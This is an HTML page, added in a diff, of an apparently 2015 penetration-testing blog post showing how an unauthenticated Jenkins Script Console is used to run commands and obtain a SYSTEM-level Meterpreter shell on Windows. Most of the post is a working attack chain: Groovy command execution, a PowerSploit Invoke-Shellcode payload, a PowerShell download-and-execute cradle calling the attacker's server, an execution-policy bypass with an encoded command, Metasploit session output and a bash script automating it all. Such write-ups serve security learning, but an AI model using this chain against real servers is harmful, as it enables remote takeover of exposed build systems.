@@ -1,0 +1,468 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>jenkins to meterpreter - toying with powersploit - #!/slash/note</title>
+  <meta name="author" content="Leon Jacobs">
+
+  
+  <meta name="description" content="Recently I came across a few Jenkins continuous integration servers. A relatively old version I might add but that fact was not important. What was &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-44457032-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">#!/slash/note</a></h1>
+  
+    <h2>A checkbox unchecker's notepad</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:leonjza.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">jenkins to meterpreter - toying with powersploit</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-05-26T20:40:40+02:00" pubdate data-updated="true">May 26<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><img class="right" src="https://i.imgur.com/DNRQ8Nv.png"></p>
+
+<p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.</p>
+
+<!--more-->
+
+
+<h2>groooooooovy</h2>
+
+<p>At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the <em>Script Console</em> that Jenkins provides:</p>
+
+<p><img src="https://i.imgur.com/5X43NOP.png"></p>
+
+<p>This looked promising. <em>&lsquo;Type in an arbitrary Groovy script and execute it on the server.&rsquo;</em> I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained the the <a href="http://www.groovy-lang.org/groovy-dev-kit.html#process-management">documentation</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>def process = &quot;ls -l&quot;.execute()
+</span><span class='line'>println &quot;Found text ${process.text}&quot;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!</p>
+
+<p><img src="https://i.imgur.com/UY83gvp.png"></p>
+
+<p>Nice and easy command execution! :D</p>
+
+<h2>interactive shell, power shell</h2>
+
+<p>Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a> and moving on from there. On Windows based environments though, the builtin <code>cmd.exe</code> definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.</p>
+
+<p>The one Jenkins machine that I had found was running on Windows as <code>nt authority\system</code>, which of course was <em>great</em> news! I figured though that in order to get a meterpreter shell, I&rsquo;d have to approach this in some conventional way of obtaining credentials and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. <em>Or&hellip;</em> I could just make use of <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a> to download and execute one using one command.</p>
+
+<p>Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.</p>
+
+<p>In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A <code>payload</code> which includes the <code>Invoke-Shellcode.ps1</code> powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&rsquo;t worry it should be more clear after we have gone through it.</p>
+
+<h2>preparing the payload</h2>
+
+<p>As already mentioned, I was going to use <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a>. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about <em>payload</em> here, all it really is is a file that will be made available via HTTP for the powershell script to download.</p>
+
+<p>The payload will consist of 2 parts. First, defining <code>function Invoke-Shellcode {}</code>, and then invoking the function for a <code>windows/meterpreter/reverse_https</code> shell. Kali Linux has powersploit available in <code>/usr/share</code> so all I really did was cat it to my <code>payload</code> file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After that, I added the following line to the <code>payload</code> file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport 443 -Force
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This file was finally served via HTTP using the python SimpleHTTPServer with <code>python -m SimpleHTTPServer</code> which meant that it would be available at <a href="http://192.168.252.1:8000/payload.">http://192.168.252.1:8000/payload.</a></p>
+
+<h2>preparing the command</h2>
+
+<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href="https://technet.microsoft.com/en-us/library/hh849893.aspx">Invoke-Expression</a> command and give it a <a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx">Net.WebClient.DownloadString</a> object to download the payload we previously prepared and execute it.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">iex</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.252.1:8000/payload&#39;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That whole command needs to be <a href="http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx">encoded</a> so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="nv">$scriptblock</span> <span class="p">|</span> iconv --to-code UTF-16LE <span class="p">|</span> base64 -w 0
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The above will output a base64 encoded string that should be passed to the Powershell <code>-Enc</code> flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing <code>-Exec ByPass</code> to the powershell executable. So, in summary, the command will be as follows:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Exec</span> <span class="n">ByPass</span> <span class="n">-Nol</span> <span class="n">-Enc</span> <span class="n">aQBlAHgAIAAoAE4</span> <span class="no">[snip]</span> <span class="n">BjBkACcAKQAKAA</span><span class="p">==</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>pwn</h2>
+
+<p>So, I now had the <code>payload</code> file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!</p>
+
+<p><img src="https://i.imgur.com/xBh1Uz9.png"></p>
+
+<p>From the python web server we can see the request come in for the payload:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>192.168.252.100 - - [28/May/2015 12:37:15] &quot;GET /payload HTTP/1.1&quot; 200 -
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And pop!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://0.0.0.0:443/
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.252.100:54023 Request received <span class="k">for</span> /INITM...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.252.100:54023 Staging connection <span class="k">for </span>target /INITM received...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.252.1:443 -&gt; 192.168.252.100:54023<span class="o">)</span> at 2015-05-28 12:37:17 +0200
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt;
+</span><span class='line'>meterpreter &gt; getuid
+</span><span class='line'>Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>automation</h2>
+
+<p>While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># meterpreter ip &amp; port</span>
+</span><span class='line'><span class="nv">lhost</span><span class="o">=</span>192.168.252.1
+</span><span class='line'><span class="nv">lport</span><span class="o">=</span>443
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Writing Payload&quot;</span>
+</span><span class='line'>cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force&quot;</span> &gt;&gt; payload
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Prepping Command&quot;</span>
+</span><span class='line'><span class="nv">scriptblock</span><span class="o">=</span><span class="s2">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://$lhost:8000/payload&#39;)&quot;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$scriptblock</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Encoding command&quot;</span>
+</span><span class='line'><span class="nv">encode</span><span class="o">=</span><span class="s2">&quot;`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`&quot;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$encode</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">command</span><span class="o">=</span><span class="s2">&quot;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode&quot;</span>
+</span><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Final command&quot;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$command</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Starting HTTP Server to serve payload&quot;</span>
+</span><span class='line'>python -m SimpleHTTPServer
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-05-26T20:40:40+02:00" pubdate data-updated="true">May 26<sup>th</sup>, 2015</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/command-execution/'>command execution</a>, <a class='category' href='/blog/categories/jenkins/'>jenkins</a>, <a class='category' href='/blog/categories/meterpreter/'>meterpreter</a>, <a class='category' href='/blog/categories/powershell/'>powershell</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/05/09/playing-exploit-exercises-nebula/" title="Previous Post: playing exploit-exercises - nebula">&laquo; playing exploit-exercises - nebula</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <br>
+  <p>
+    <a href="https://leonjza.github.io/about/">Another caffeine fueled security guy.</a>
+ </p>
+</section>
+<section>
+ <p>
+    <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="https://i.imgur.com/JhlbTFA.png"></a>
+ </p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit/">jenkins to meterpreter - toying with powersploit</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/09/playing-exploit-exercises-nebula/">playing exploit-exercises - nebula</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/">beating sokar - the vulnhub turns 0b10 challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/">a trivial iOS jailbreak detection bypass</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/">no more jailbreak detection - an adventure into Android app reversing and smali patching</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/23/hoof-to-root-solving-pegasus-1/">hoof to root ? - solving pegasus 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">playing in the playground - a offsec virtual pentesting labs review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/22/trying-harder-oscp-and-me/">trying harder - oscp and me</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/09/solving-kvasir-netcat-edition/">solving kvasir - netcat edition</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'leonjza',
+            count: 8,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Leon Jacobs -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
